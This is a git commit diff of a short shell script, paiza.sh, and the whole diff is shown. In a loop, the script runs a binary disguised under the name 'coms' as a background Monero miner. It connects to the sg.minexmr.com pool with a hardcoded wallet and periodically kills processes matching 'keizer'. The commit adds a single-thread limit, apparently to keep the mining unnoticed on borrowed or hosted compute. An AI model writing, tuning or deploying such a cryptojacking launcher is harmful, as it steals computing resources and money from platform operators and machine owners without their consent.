d412f3ecd30acf2d64425e15a1e5c12f9185b383
azzfarrcolab <72619602+azzfarrcolab@users.noreply.github.com>
2020-11-10 03:17:52 +0700

    Update paiza.sh

--- paiza.sh
+++ paiza.sh
@@ -1,7 +1,7 @@
 #!/bin/sh 
  while true;
   do
-  ./coms --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -k --background
+  ./coms --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -t 1 -k --background
   sleep 1500
   kill $(ps aux | grep 'keizer' | awk '{print $2}');
   sleep 15
